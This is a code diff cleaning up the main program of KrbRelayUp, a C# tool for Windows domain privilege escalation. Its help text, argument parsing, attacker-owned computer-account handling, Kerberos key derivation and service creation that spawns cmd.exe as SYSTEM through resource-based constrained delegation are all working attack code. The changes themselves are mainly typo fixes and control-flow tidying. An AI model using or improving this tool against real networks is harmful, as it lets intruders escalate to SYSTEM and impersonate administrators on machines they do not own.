@@ -1,17 +1,8 @@
-﻿using Asn1;
-using KrbRelayUp.Asn1;
-using KrbRelayUp.Kerberos;
-using KrbRelayUp.Kerberos.PAC;
-using KrbRelayUp.lib.Interop;
 using System;
-using System.Collections.Generic;
-using System.DirectoryServices;
 using System.DirectoryServices.Protocols;
-using System.Linq;
 using System.Security.Principal;
 using System.Text;
 using System.Text.RegularExpressions;
-using System.Threading;
 
 namespace KrbRelayUp
 {
@@ -37,8 +28,8 @@ namespace KrbRelayUp
             Console.WriteLine("Usage: KrbRelayUp.exe relay -d FQDN -cn COMPUTERNAME [-c] [-cp PASSWORD | -ch NTHASH]\n");
             Console.WriteLine("    -d  (--Domain)                   FQDN of domain.");
             Console.WriteLine("    -c  (--CreateNewComputerAccount)    Create new computer account for RBCD. Will use the current authenticated user.");
-            Console.WriteLine("    -cn (--ComputerName)             Name of attacker owned computer account for RBCD. (deafult=KRBRELAYUP$ [if -c is enabled])");
-            Console.WriteLine("    -cp (--ComputerPassword)         Password of computer account for RBCD. (deafult=RANDOM [if -c is enabled])");
+            Console.WriteLine("    -cn (--ComputerName)             Name of attacker owned computer account for RBCD. (default=KRBRELAYUP$ [if -c is enabled])");
+            Console.WriteLine("    -cp (--ComputerPassword)         Password of computer account for RBCD. (default=RANDOM [if -c is enabled])");
             Console.WriteLine("    -ch (--ComputerPasswordHash)     Password NT hash of computer account for RBCD. (Optional)");
             Console.WriteLine("    -p  (--Port)                     Port for Com Server (default=12345)");
             
@@ -46,10 +37,10 @@ namespace KrbRelayUp
             Console.WriteLine("SPAWN:");
             Console.WriteLine("Usage: KrbRelayUp.exe spawn -d FQDN -cn COMPUTERNAME [-cp PASSWORD | -ch NTHASH] <-i USERTOIMPERSONATE>\n");
             Console.WriteLine("    -d  (--Domain)                   FQDN of domain.");
-            Console.WriteLine("    -cn (--ComputerName)             Name of attacker owned computer account for RBCD. (deafult=KRBRELAYUP$ [if -c is enabled])");
-            Console.WriteLine("    -cp (--ComputerPassword)         Password of computer account for RBCD. (deafult=RANDOM [if -c is enabled])");
+            Console.WriteLine("    -cn (--ComputerName)             Name of attacker owned computer account for RBCD. (default=KRBRELAYUP$ [if -c is enabled])");
+            Console.WriteLine("    -cp (--ComputerPassword)         Password of computer account for RBCD. (default=RANDOM [if -c is enabled])");
             Console.WriteLine("    -ch (--ComputerPasswordHash)     Password NT hash of computer account for RBCD. (Optional)");
-            Console.WriteLine("    -i  (--Impersonate)              User to impersonate. should be a local admininstrator in the target computer. (default=Administrator)");
+            Console.WriteLine("    -i  (--Impersonate)              User to impersonate. should be a local administrator in the target computer. (default=Administrator)");
             Console.WriteLine("    -s  (--ServiceName)              Name of the service to be created. (default=KrbSCM)");
             Console.WriteLine("    -sc (--ServiceCommand)           Service command [binPath]. (default = spawn cmd.exe as SYSTEM");
 
@@ -60,7 +51,6 @@ namespace KrbRelayUp
             Console.WriteLine("    -sc (--ServiceCommand)           Service command [binPath]. (default = spawn cmd.exe as SYSTEM");
 
             Console.WriteLine("");
-            Environment.Exit(0);
         }
 
         static void Main(string[] args)
@@ -70,6 +60,7 @@ namespace KrbRelayUp
             if (args.Length == 0)
             {
                 GetHelp();
+                return;
             }
 
             if (args[0].ToLower() == "system")
@@ -79,10 +70,8 @@ namespace KrbRelayUp
                     KrbSCM.RunSystemProcess(Convert.ToInt32(args[1]));
                 }
                 catch { }
-                Environment.Exit(0);
+                return;
             }
-
-            
 
             // parse args
             int iDomain = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(d|Domain)$").Match(s).Success);
@@ -94,7 +83,6 @@ namespace KrbRelayUp
             int iImpersonate = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(i|Impersonate)$").Match(s).Success);
             int iServiceName = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(s|ServiceName)$").Match(s).Success);
             int iServiceCommand = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(sc|ServiceCommand)$").Match(s).Success);
-
 
             if (iServiceName != -1)
                 serviceName = args[iServiceName + 1];
@@ -112,6 +100,7 @@ namespace KrbRelayUp
             {
                 Console.WriteLine("Must supply FQDN using [-d FQDN]");
                 GetHelp();
+                return;
             }
 
             domain = args[iDomain + 1];
@@ -173,9 +162,8 @@ namespace KrbRelayUp
                     {
                         Console.WriteLine($"[-] Could not add new computer account:");
                         Console.WriteLine($"[-] {e.Message}");
-                        Environment.Exit(0);
+                        return;
                     }
-
                 }
 
                 // Get Computer SID for RBCD
@@ -194,7 +182,7 @@ namespace KrbRelayUp
 
                 if (!String.IsNullOrEmpty(computerPassword))
                 {
-                    string salt = String.Format("{0}host{1}.{2}", domain.ToUpper(), computerName.ToLower(), domain.ToLower());
+                    string salt = $"{domain.ToUpper()}host{computerName.ToLower()}.{domain.ToLower()}";
                     hash = Crypto.KerberosPasswordHash(Interop.KERB_ETYPE.aes256_cts_hmac_sha1, computerPassword, salt);
                     eType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
                 }
@@ -218,19 +206,16 @@ namespace KrbRelayUp
                 System.Threading.Thread.Sleep(1500);
 
                 KrbSCM.Run(targetSPN, serviceName, serviceCommand);
-                Environment.Exit(0);
             }
-
-
         }
 
         public static string GetObjectSidForComputerName(LdapConnection ldapConnection, string computerName, string searchBase)
         {
             string searchFilter = $"(sAMAccountName={computerName}$)";
-            SearchRequest searchRequest = new SearchRequest(searchBase, searchFilter, System.DirectoryServices.Protocols.SearchScope.Subtree, new string[] { "DistinguishedName", "objectSid" });
+            SearchRequest searchRequest = new SearchRequest(searchBase, searchFilter, SearchScope.Subtree, "DistinguishedName", "objectSid");
             try
             {
-                var response = (SearchResponse)ldapConnection.SendRequest(searchRequest);
+                SearchResponse response = (SearchResponse)ldapConnection.SendRequest(searchRequest);
                 return (new SecurityIdentifier((byte[])response.Entries[0].Attributes["objectSid"][0], 0)).ToString();
             }
             catch (Exception e)
